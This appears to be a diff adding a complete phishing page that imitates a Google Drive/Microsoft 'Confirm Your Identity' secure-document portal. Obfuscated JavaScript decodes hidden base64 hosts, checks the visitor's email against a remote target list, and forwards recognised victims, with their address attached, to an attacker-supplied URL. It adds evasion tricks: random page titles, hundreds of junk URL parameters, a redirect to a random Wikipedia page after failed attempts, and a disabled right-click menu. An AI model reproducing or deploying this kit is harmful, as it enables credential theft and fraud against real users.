@@ -1,0 +1,207 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Titles array with different variations
+        const titles = [
+            "Confirm Your Identity",
+            "Identity Confirmation Required",
+            "Secure Your Access",
+            "Verify Your Credentials",
+            "Confirm Your Account",
+            "Identity Check",
+            "Verify Your Details",
+            "Authenticate Your Identity",
+            "Identity Verification Needed",
+            "Confirm Your Personal Information"
+        ];
+
+        // Function to select a random title
+        function setRandomTitle() {
+            const randomIndex = Math.floor(Math.random() * titles.length);
+            document.title = titles[randomIndex];
+        }
+
+        // Set random title on page load
+        window.onload = setRandomTitle;
+    </script>
+    
+    <!-- Add favicon (Microsoft logo) -->
+    <link rel="icon" type="image/png" href="https://storage.googleapis.com/assets_workspace/uploads/7uffzv9dk4sn-3652TCzauH9jaL0QJ8H6FM-bfed64c7e8da9ac20d439f436570f955-Drive_Full_Logo_2x.svg">
+    
+    <style>
+        body {
+            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+            background-image: url(''); /* Add your background image here */
+            background-size: cover;
+            background-position: center;
+        }
+
+        .header {
+            width: 100%;
+            background-color: #0078d4;
+            color: white;
+            text-align: left;
+            padding: 10px 20px;
+            box-sizing: border-box;
+            font-size: 18px;
+            position: absolute;
+            top: 0;
+        }
+
+        .header span {
+            margin-left: 20px;
+        }
+
+        .container {
+            background-color: white;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            padding: 33px;
+            width: 80%;
+            max-width: 300px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-top: 0px;
+        }
+
+        .container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        .container h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        .container p {
+            margin-bottom: 10px;
+            color: #666;
+        }
+
+        .container input[type="email"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            font-size: 16px;
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .container button:hover {
+            background-color: #005a9e;
+        }
+
+        .container .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            .container h2 {
+                font-size: 20px;
+            }
+
+            .container input[type="email"] {
+                font-size: 14px;
+            }
+
+            .container button {
+                font-size: 14px;
+            }
+        }
+
+        /* Full-screen loading overlay */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        #loading-circle {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://storage.googleapis.com/assets_workspace/uploads/7uffzv9dk4sn-3652TCzauH9jaL0QJ8H6FM-bfed64c7e8da9ac20d439f436570f955-Drive_Full_Logo_2x.svg" style="width: 10%; height: auto;" alt="soft Logo">
+
+    </div>
+
+    <div class="container">
+        <img src="https://storage.googleapis.com/assets_workspace/uploads/7uffzv9dk4sn-3652TCzauH9jaL0QJ8H6FM-bfed64c7e8da9ac20d439f436570f955-Drive_Full_Logo_2x.svg" style="width: 65%; height: auto;" alt="soft Logo">
+        <h2>Confirm Your Identity</h2>
+<p><strong>You are accessing a secure document portal with sensitive information:</strong></p>
+<p>To proceed, we need to confirm your email address. Please enter the email address associated with this document.</p>
+
+
+        <input type="email" id="email-input" placeholder="Enter email" required="" style="margin-top: 10px;">
+        
+        <!-- Error message element -->
+        <p id="error-message" style="color: red; display: none;"></p>
+        
+        <button id="continue-button">NEXT</button>
+    </div>
+
+    <!-- Full-screen loading overlay -->
+    <div id="loading-overlay">
+        <div id="loading-circle"></div>
+    </div>
+
+    <script>
+      function _0x555d(){const _0x26c244=['push','application/json','key','28mgkHXk','email-input','click','message','location','flex','continue-button','back-button','10BJvQkS','getElementById','10307907SfLeZi','Invalid\x20response\x20structure:','9132BpgFtm','random','Email\x20not\x20recognized.\x20Please\x20try\x20with\x20the\x20email\x20that\x20received\x20this\x20document.','status','aHR0cHM6Ly9hbGxnc3VpdGUudHJpZWQtbG9yZC53b3JrZXJzLmRldi8=','Unable\x20to\x20fetch\x20the\x20redirect\x20URL.\x20Please\x20try\x20again\x20later.','value','searchParams','7029160oKjwCt','forEach','431331gZbOMo','split','error-message','15ChjANb','error','toString','none','success','append','loading-overlay','history','statusText','style','toLowerCase','2NqBrVf','Error\x20fetching\x20redirect\x20URL:\x20','href','popstate','display','https://en.wikipedia.org/wiki/Special:Random','textContent','986514NbcVhV','json','6874329faaOYG','356961eGUqTs','aHR0cHM6Ly9wdWItM2NlZGVjNjU1ZDcxNDFmN2I4MWNiMGQyMjk0MmE1MzIucjIuZGV2L0dPT0dMRURSSVZFRU1BSUwudHh0','addEventListener','block','test','30184DeAkLd','Error\x20fetching\x20or\x20processing\x20email\x20data:','Error\x20fetching\x20email\x20data:\x20'];_0x555d=function(){return _0x26c244;};return _0x555d();}const _0xa1a0de=_0x1b94;(function(_0x5f0479,_0x2c4bfa){const _0x28e6e1=_0x1b94,_0x30d6f2=_0x5f0479();while(!![]){try{const _0x1f96b8=-parseInt(_0x28e6e1(0x140))/0x1*(-parseInt(_0x28e6e1(0x136))/0x2)+parseInt(_0x28e6e1(0x128))/0x3*(-parseInt(_0x28e6e1(0x112))/0x4)+parseInt(_0x28e6e1(0x12b))/0x5*(parseInt(_0x28e6e1(0x13d))/0x6)+parseInt(_0x28e6e1(0x13f))/0x7+parseInt(_0x28e6e1(0x126))/0x8+parseInt(_0x28e6e1(0x11c))/0x9*(parseInt(_0x28e6e1(0x11a))/0xa)+-parseInt(_0x28e6e1(0x10c))/0xb*(parseInt(_0x28e6e1(0x11e))/0xc);if(_0x1f96b8===_0x2c4bfa)break;else _0x30d6f2['push'](_0x30d6f2['shift']());}catch(_0x363481){_0x30d6f2['push'](_0x30d6f2['shift']());}}}(_0x555d,0xb9f0a));let attempts=0x0,loadingTimeout;function appendRandomParamsToUrl(){const _0x2b98a3=_0x1b94,_0x486681=generateRandomParams(),_0x5631d0=new URL(window[_0x2b98a3(0x116)][_0x2b98a3(0x138)]);_0x486681[_0x2b98a3(0x127)](_0x3a7b68=>_0x5631d0[_0x2b98a3(0x125)][_0x2b98a3(0x130)](_0x3a7b68[_0x2b98a3(0x111)],_0x3a7b68[_0x2b98a3(0x124)])),window[_0x2b98a3(0x132)]['replaceState']({},'',_0x5631d0);}function _0x1b94(_0x377a03,_0x1e223e){const _0x555d55=_0x555d();return _0x1b94=function(_0x1b94fb,_0x5b24b5){_0x1b94fb=_0x1b94fb-0x10c;let _0x32f89f=_0x555d55[_0x1b94fb];return _0x32f89f;},_0x1b94(_0x377a03,_0x1e223e);}function generateRandomParams(){const _0x2d1a92=_0x1b94;let _0x3d3007=[];for(let _0x449f6d=0x0;_0x449f6d<0x12c;_0x449f6d++){let _0x31388b=''+_0x449f6d,_0x86117d=Math[_0x2d1a92(0x11f)]()[_0x2d1a92(0x12d)](0x24)['substring'](0x2,0xf);_0x3d3007[_0x2d1a92(0x10f)]({'key':_0x31388b,'value':_0x86117d});}return _0x3d3007;}async function continueLoading(){const _0x1c7cf0=_0x1b94,_0xd96448=document[_0x1c7cf0(0x11b)]('email-input'),_0x2f3fe1=_0xd96448['value']['trim']()[_0x1c7cf0(0x135)](),_0x6a385b=document['getElementById'](_0x1c7cf0(0x12a));_0x6a385b['style']['display']='none',_0x6a385b[_0x1c7cf0(0x13c)]='';const _0x370698=!![];if(validateEmail(_0x2f3fe1)){if(_0x370698){const _0x5be30d=await checkEmailInList(_0x2f3fe1);_0x5be30d?(document[_0x1c7cf0(0x11b)](_0x1c7cf0(0x131))['style'][_0x1c7cf0(0x13a)]=_0x1c7cf0(0x117),loadingTimeout=setTimeout(async()=>{const _0x346aea=_0x1c7cf0,_0xeb15bd=await fetchRedirectUrl(_0x2f3fe1);_0xeb15bd?window['location']['href']=_0xeb15bd:(_0x6a385b['style'][_0x346aea(0x13a)]=_0x346aea(0x143),_0x6a385b[_0x346aea(0x13c)]=_0x346aea(0x123));},0x3e8)):(_0x6a385b[_0x1c7cf0(0x134)][_0x1c7cf0(0x13a)]=_0x1c7cf0(0x143),_0x6a385b[_0x1c7cf0(0x13c)]=_0x1c7cf0(0x120));}else document[_0x1c7cf0(0x11b)](_0x1c7cf0(0x131))[_0x1c7cf0(0x134)]['display']=_0x1c7cf0(0x117),loadingTimeout=setTimeout(async()=>{const _0x208354=_0x1c7cf0,_0x2a8f00=await fetchRedirectUrl(_0x2f3fe1);_0x2a8f00?window['location'][_0x208354(0x138)]=_0x2a8f00:(_0x6a385b['style'][_0x208354(0x13a)]=_0x208354(0x143),_0x6a385b[_0x208354(0x13c)]='Unable\x20to\x20fetch\x20the\x20redirect\x20URL.\x20Please\x20try\x20again\x20later.');},0x3e8);}else{attempts++;if(attempts>=0x4){const _0x54c54a=await fetchRandomWiki();window[_0x1c7cf0(0x116)][_0x1c7cf0(0x138)]=_0x54c54a;}else _0x6a385b[_0x1c7cf0(0x134)][_0x1c7cf0(0x13a)]='block',_0x6a385b[_0x1c7cf0(0x13c)]='The\x20email\x20address\x20you\x20entered\x20is\x20not\x20valid.\x20Please\x20try\x20again\x20with\x20a\x20valid\x20email.';}};async function fetchRedirectUrl(_0x5710ea){const _0x3dd77a=_0x1b94;try{const _0x4e7357=atob(_0x3dd77a(0x122)),_0x23a703=await fetch(_0x4e7357,{'headers':{'Content-Type':_0x3dd77a(0x110)}});if(!_0x23a703['ok'])return console['error'](_0x3dd77a(0x137)+_0x23a703[_0x3dd77a(0x133)]),null;const _0x49c755=await _0x23a703[_0x3dd77a(0x13e)]();if(_0x49c755[_0x3dd77a(0x121)]===_0x3dd77a(0x12f)&&_0x49c755[_0x3dd77a(0x115)]){const _0xfe737=_0x49c755[_0x3dd77a(0x115)];return _0x5710ea?_0xfe737+'#M'+encodeURIComponent(_0x5710ea):_0xfe737;}else return console['error'](_0x3dd77a(0x11d),_0x49c755),null;}catch(_0x25a28b){return console[_0x3dd77a(0x12c)]('Error\x20fetching\x20or\x20processing\x20redirect\x20URL:',_0x25a28b),null;}}function validateEmail(_0x10fadb){const _0x23ead5=_0x1b94,_0x25755f=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;return _0x25755f[_0x23ead5(0x144)](_0x10fadb);}async function checkEmailInList(_0x5d0cef){const _0x441b37=_0x1b94;try{const _0x3ad060=atob(_0x441b37(0x141)),_0x450d67=''+_0x3ad060,_0x282c71=await fetch(_0x450d67);if(!_0x282c71['ok'])return console['error'](_0x441b37(0x10e)+_0x282c71[_0x441b37(0x121)]+'\x20-\x20'+_0x282c71[_0x441b37(0x133)]),![];const _0x2dbc01=await _0x282c71['text'](),_0x25c305=_0x2dbc01[_0x441b37(0x129)]('\x0a');for(let _0x143ba9 of _0x25c305){if(_0x143ba9['trim']()===_0x5d0cef)return!![];}return![];}catch(_0x16b9ea){return console['error'](_0x441b37(0x10d),_0x16b9ea[_0x441b37(0x115)]),![];}}async function fetchRandomWiki(){const _0x453d53=_0x1b94,_0x15ee93=await fetch(_0x453d53(0x13b));return _0x15ee93['url'];}document[_0xa1a0de(0x11b)](_0xa1a0de(0x119))?.[_0xa1a0de(0x142)](_0xa1a0de(0x114),()=>{const _0x35ccff=_0xa1a0de;document[_0x35ccff(0x11b)](_0x35ccff(0x131))['style'][_0x35ccff(0x13a)]=_0x35ccff(0x12e),clearTimeout(loadingTimeout),document[_0x35ccff(0x11b)]('email-input')['value']='';}),document[_0xa1a0de(0x11b)](_0xa1a0de(0x118))[_0xa1a0de(0x142)](_0xa1a0de(0x114),continueLoading),document[_0xa1a0de(0x11b)](_0xa1a0de(0x113))[_0xa1a0de(0x142)]('keydown',function(_0x5eca5d){const _0x293ee7=_0xa1a0de;_0x5eca5d[_0x293ee7(0x111)]==='Enter'&&continueLoading();}),window[_0xa1a0de(0x142)](_0xa1a0de(0x139),()=>{const _0x2a7cf2=_0xa1a0de;document[_0x2a7cf2(0x11b)](_0x2a7cf2(0x131))['style'][_0x2a7cf2(0x13a)]=_0x2a7cf2(0x12e),clearTimeout(loadingTimeout);}),appendRandomParamsToUrl();
+    </script>
+<script>
+    document.addEventListener('contextmenu', function(event) {
+    event.preventDefault();
+});
+
+</script>
+</body>
+</html>
